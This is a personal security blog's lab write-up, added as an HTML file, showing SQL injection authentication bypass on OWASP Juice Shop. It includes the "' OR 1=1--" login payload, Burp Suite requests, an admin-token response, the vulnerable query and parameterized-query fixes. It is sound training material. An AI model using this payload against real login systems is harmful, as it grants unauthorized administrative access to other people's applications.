@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection – Authentication Bypass | ThreatLens</title>
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="stylesheet" href="../css/post-styles.css">
+    <link rel="shortcut icon" href="../logos/logo.svg" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar" id="navbar">
+        <div class="container nav-container">
+            <div class="nav-brand">
+                <img src="../logos/logo.svg" alt="ThreatLens Logo" style="width: 35px; height: 35px;">
+                <span>ThreatLens</span>
+            </div>
+            <button class="nav-toggle" id="navToggle">
+                <span></span><span></span><span></span>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="../index.html" class="nav-link">Home</a></li>
+                <li><a href="../index.html#learning-paths" class="nav-link">Learning Paths</a></li>
+                <li><a href="../all-posts.html" class="nav-link active">All Posts</a></li>
+                <li><a href="../index.html#about" class="nav-link">About</a></li>
+            </ul>
+            <div class="nav-search" onclick="window.location.href='../all-posts.html'" style="cursor: pointer;">
+                <i class="fas fa-search"></i>
+            </div>
+        </div>
+    </nav>
+
+    <article class="post-article">
+        <div class="post-header">
+            <div class="container">
+                <div class="breadcrumb">
+                    <a href="../index.html"><i class="fas fa-home"></i> Home</a>
+                    <span>/</span>
+                    <a href="../penetration-testing.html">Jr Penetration Tester</a>
+                    <span>/</span>
+                    <span>SQL Injection – Authentication Bypass</span>
+                </div>
+                <div class="post-category-badge" style="background: rgba(211,47,47,0.15); color: #ef5350; border: 1px solid rgba(211,47,47,0.3);">Jr Penetration Tester</div>
+                <h1 class="post-main-title">SQL Injection – Authentication Bypass</h1>
+                <div class="post-meta-info">
+                    <div class="meta-item"><i class="fas fa-calendar"></i><span>March 12, 2026</span></div>
+                    <div class="meta-item"><i class="fas fa-clock"></i><span>7 min read</span></div>
+                    <div class="meta-item"><i class="fas fa-flask"></i><span>OWASP Juice Shop</span></div>
+                </div>
+                <div class="post-tags-header">
+                    <span class="tag">SQL Injection</span>
+                    <span class="tag">Authentication Bypass</span>
+                    <span class="tag">OWASP A03</span>
+                    <span class="tag">Burp Suite</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="post-body">
+            <div class="container post-container">
+                <aside class="post-sidebar">
+                    <div class="toc-wrapper">
+                        <h3 class="toc-title">Table of Contents</h3>
+                        <nav class="toc">
+                            <ul>
+                                <li><a href="#summary" class="toc-link active">Vulnerability Summary</a></li>
+                                <li><a href="#classification" class="toc-link">Classification</a></li>
+                                <li><a href="#attack-scenario" class="toc-link">Attack Scenario</a></li>
+                                <li><a href="#steps" class="toc-link">Steps to Reproduce</a></li>
+                                <li><a href="#proof" class="toc-link">Proof of Exploitation</a></li>
+                                <li><a href="#root-cause" class="toc-link">Root Cause</a></li>
+                                <li><a href="#mitigation" class="toc-link">Mitigation</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <div class="share-section">
+                        <h4>Share This Post</h4>
+                        <div class="share-buttons">
+                            <a href="#" class="share-btn linkedin"><i class="fab fa-linkedin"></i></a>
+                            <a href="#" class="share-btn reddit"><i class="fab fa-reddit"></i></a>
+                            <a href="#" class="share-btn link"><i class="fas fa-link"></i></a>
+                        </div>
+                    </div>
+                </aside>
+
+                <div class="post-content-main">
+
+                    <section id="summary">
+                        <h2>Vulnerability Summary</h2>
+                        <p>The application is vulnerable to <strong>SQL Injection</strong> in the login authentication mechanism. User-supplied input in the <strong>email field</strong> is not sanitized before being used in the backend SQL query.</p>
+                        <p>An attacker can inject SQL statements that manipulate the query logic, allowing them to log in as <strong>any user — including the administrator</strong> — without knowing the correct password.</p>
+
+                        <div class="callout callout-warning">
+                            <div class="callout-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                            <div class="callout-content">
+                                <strong>Target:</strong> OWASP Juice Shop &nbsp;|&nbsp;
+                                <strong>Tool:</strong> Burp Suite &nbsp;|&nbsp;
+                                <strong>Environment:</strong> Kali Linux &nbsp;|&nbsp;
+                                <strong>OWASP Category:</strong> A03 – Injection
+                            </div>
+                        </div>
+                    </section>
+
+                    <section id="classification">
+                        <h2>Vulnerability Classification</h2>
+                        <div class="settings-table">
+                            <table>
+                                <thead><tr><th>Category</th><th>Value</th></tr></thead>
+                                <tbody>
+                                    <tr><td>OWASP Top 10</td><td><strong>A03 – Injection</strong></td></tr>
+                                    <tr><td>Vulnerability Type</td><td>SQL Injection</td></tr>
+                                    <tr><td>Attack Vector</td><td>Login Authentication (email field)</td></tr>
+                                    <tr><td>Affected Endpoint</td><td><code class="inline-code">POST /rest/user/login</code></td></tr>
+                                    <tr><td>Impact</td><td>Authentication Bypass / Admin Access</td></tr>
+                                    <tr><td>Severity</td><td><strong style="color:#d32f2f;">Critical</strong></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <div class="callout callout-info">
+                            <div class="callout-icon"><i class="fas fa-shield-alt"></i></div>
+                            <div class="callout-content">
+                                <strong>Severity Metrics</strong>
+                                <ul style="margin: 0.5rem 0 0 0;">
+                                    <li>Attack Complexity: <strong>Low</strong></li>
+                                    <li>Privileges Required: <strong>None</strong></li>
+                                    <li>User Interaction: <strong>None</strong></li>
+                                    <li>Impact: <strong>Critical</strong> — full authentication bypass</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </section>
+
+                    <section id="attack-scenario">
+                        <h2>Attack Scenario</h2>
+                        <p>The attacker injects SQL syntax into the <strong>email parameter</strong> of the login request. The injected payload breaks out of the string context and adds a condition that always evaluates to true, bypassing password verification entirely.</p>
+
+                        <h3>The Payload</h3>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">SQL Injection Payload</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code>user2@gmail.com' OR 1=1--</code></pre>
+                        </div>
+
+                        <h3>How the Payload Works</h3>
+                        <div class="settings-table">
+                            <table>
+                                <thead><tr><th>Part</th><th>Effect</th></tr></thead>
+                                <tbody>
+                                    <tr><td><code class="inline-code">'</code></td><td>Closes the string literal opened by the application</td></tr>
+                                    <tr><td><code class="inline-code">OR 1=1</code></td><td>Adds a condition that is always true — returns a valid user</td></tr>
+                                    <tr><td><code class="inline-code">--</code></td><td>SQL comment — everything after this (including the password check) is ignored</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </section>
+
+                    <section id="steps">
+                        <h2>Steps to Reproduce</h2>
+
+                        <h3>Step 1 — Access the Login Page</h3>
+                        <div class="code-block">
+                            <div class="code-header"><span class="code-language">URL</span></div>
+                            <pre><code>http://localhost:3000/#/login</code></pre>
+                        </div>
+
+                        <h3>Step 2 — Intercept the Login Request</h3>
+                        <img src="./A05 SQL Injection/1.png" alt="pic" style="width: 100%; height: auto;">
+                        <p>Enable Burp Suite Proxy and submit a normal login. Capture the request:</p>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">Intercepted Request</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-http">POST /rest/user/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{
+  "email": "user2@gmail.com",
+  "password": "User2"
+}</code></pre>
+                        </div>
+
+                        <h3>Step 3 — Send to Repeater and Inject Payload</h3>
+                        <img src="./A05 SQL Injection/2.png" alt="pic" style="width: 100%; height: auto;">
+                        <p>Right-click → <strong>Send to Repeater</strong>. Replace the email value with the injection payload:</p>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">Modified Request Body</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-json">{
+  "email": "user2@gmail.com' OR 1=1--",
+  "password": "User2"
+}</code></pre>
+                        </div>
+
+                        <div class="callout callout-info">
+                            <div class="callout-icon"><i class="fas fa-lightbulb"></i></div>
+                            <div class="callout-content">
+                                The password field can be anything — it is completely ignored because the <code class="inline-code">--</code> comment character removes the password check from the SQL query.
+                            </div>
+                        </div>
+
+                        <h3>Step 4 — Send the Request</h3>
+                        <img src="./A05 SQL Injection/3.png" alt="pic" style="width: 100%; height: auto;">
+                        <p>Click Send in Burp Repeater and observe the response.</p>
+                    </section>
+
+                    <section id="proof">
+                        <h2>Proof of Exploitation</h2>
+                        <p>The server returns <code class="inline-code">HTTP 200 OK</code> with a valid JWT and the admin email:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">Server Response</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-json">{
+  "authentication": {
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+  },
+  "bid": 4,
+  "umail": "admin@juice-sh.op"
+}</code></pre>
+                            </div>
+                            <img src="./A05 SQL Injection/4.png" alt="pic" style="width: 100%; height: auto;">
+
+                        <div class="callout callout-warning">
+                            <div class="callout-icon"><i class="fas fa-exclamation-circle"></i></div>
+                            <div class="callout-content">
+                                The authenticated user is <strong>admin@juice-sh.op</strong> — the attacker successfully logged in as the administrator <strong>without knowing the password</strong>.
+                            </div>
+                        </div>
+
+                        <h3>Screenshots (Evidence)</h3>
+                        <div class="settings-table">
+                            <table>
+                                <thead><tr><th>Figure</th><th>Description</th></tr></thead>
+                                <tbody>
+                                    <tr><td>Figure 1</td><td>Login page</td></tr>
+                                    <tr><td>Figure 2</td><td>Login request intercepted in Burp Suite</td></tr>
+                                    <tr><td>Figure 3</td><td>Request sent to Burp Repeater</td></tr>
+                                    <tr><td>Figure 4</td><td>SQLi payload inserted — admin login confirmed</td></tr>
+                                    <tr><td>Figure 5</td><td>Juice Shop challenge solved confirmation</td></tr>
+                                    <tr><td>Figure 6</td><td>Comparison of authentication tokens</td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <h3>Impact</h3>
+                        <ul>
+                            <li>Authentication bypass — login as any user without credentials</li>
+                            <li>Unauthorized administrative access to the full application</li>
+                            <li>Access to all sensitive application data</li>
+                            <li>Ability to modify or delete data</li>
+                            <li>In production: potential complete system compromise</li>
+                        </ul>
+                    </section>
+
+                    <section id="root-cause">
+                        <h2>Root Cause</h2>
+                        <p>The application constructs SQL queries using <strong>unsanitized user input</strong> directly concatenated into the query string.</p>
+
+                        <h3>Vulnerable Query</h3>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">SQL — Vulnerable</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-sql">-- ❌ User input concatenated directly
+SELECT * FROM Users
+WHERE email = 'INPUT_EMAIL'
+AND password = 'INPUT_PASSWORD';</code></pre>
+                        </div>
+
+                        <h3>After Injection</h3>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">SQL — After Injection</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-sql">-- OR 1=1 is always true; -- comments out the password check
+SELECT * FROM Users
+WHERE email = 'user2@gmail.com' OR 1=1--'
+AND password = 'User2';</code></pre>
+                        </div>
+                        <p>The <code class="inline-code">OR 1=1</code> makes the WHERE clause always true. The <code class="inline-code">--</code> comments out the rest, removing the password condition. The database returns the first user row — which is the admin.</p>
+                    </section>
+
+                    <section id="mitigation">
+                        <h2>Mitigation</h2>
+
+                        <div class="feature-box">
+                            <h4><i class="fas fa-shield-alt"></i> Recommended Fixes</h4>
+                            <ul>
+                                <li><strong>Use parameterized queries</strong> — the most effective defence; user input is never interpreted as SQL</li>
+                                <li><strong>Use prepared statements</strong> — separate query structure from data at the driver level</li>
+                                <li><strong>Input validation</strong> — reject inputs containing SQL special characters (<code class="inline-code">' -- ; OR</code>)</li>
+                                <li><strong>ORM frameworks</strong> — use ORMs (Sequelize, SQLAlchemy) that handle escaping automatically</li>
+                                <li><strong>Web Application Firewall</strong> — WAF as a secondary layer to detect injection patterns</li>
+                                <li><strong>Least privilege DB permissions</strong> — the application DB user should only have the minimum required permissions</li>
+                            </ul>
+                        </div>
+
+                        <h3>Secure Query Example</h3>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span class="code-language">SQL — Parameterized Query</span>
+                                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i> Copy</button>
+                            </div>
+                            <pre><code class="language-sql">-- ✅ Input is passed as a parameter, never interpreted as SQL
+SELECT * FROM Users
+WHERE email = ?
+AND password = ?;</code></pre>
+                        </div>
+                    </section>
+
+                    <!-- Related Posts -->
+                    <div class="related-posts">
+                        <h3>Related Posts</h3>
+                        <div class="related-grid">
+                            <a href="./idor-broken-access-control.html" class="related-card">
+                                <div class="related-category pentest">Jr Penetration Tester</div>
+                                <h4>IDOR – Broken Access Control</h4>
+                                <p>Accessing other users' baskets by manipulating object references in OWASP Juice Shop...</p>
+                            </a>
+                            <a href="./xss-exploitation.html" class="related-card">
+                                <div class="related-category pentest">Jr Penetration Tester</div>
+                                <h4>Cross-Site Scripting (XSS)</h4>
+                                <p>Reflected, DOM-based, and Stored XSS exploitation in OWASP Juice Shop...</p>
+                            </a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>About</h4>
+                    <p>Documenting my journey through network security and system administration.</p>
+                </div>
+                <div class="footer-column">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="../index.html">Home</a></li>
+                        <li><a href="../all-posts.html">All Posts</a></li>
+                        <li><a href="../index.html#about">About</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Categories</h4>
+                    <ul>
+                        <li><a href="../windows-server.html">Windows Server</a></li>
+                        <li><a href="../networking.html">Networking</a></li>
+                        <li><a href="../cybersecurity-101.html">Cybersecurity</a></li>
+                        <li><a href="../penetration-testing.html">Penetration Testing</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Stay Updated</h4>
+                    <p>Follow along as I document new learnings and lab experiences.</p>
+                    <div class="social-links">
+                        <a href="https://github.com/manognya66" target="_blank"><i class="fab fa-github"></i></a>
+                        <a href="https://www.linkedin.com/in/r-shashank-manognya-070874255" target="_blank"><i class="fab fa-linkedin"></i></a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 ThreatLens. All rights reserved.</p>
+                <button class="back-to-top" id="backToTop"><i class="fas fa-chevron-up"></i></button>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="../js/script.js"></script>
+    <script src="../js/post-script.js"></script>
+</body>
+</html>
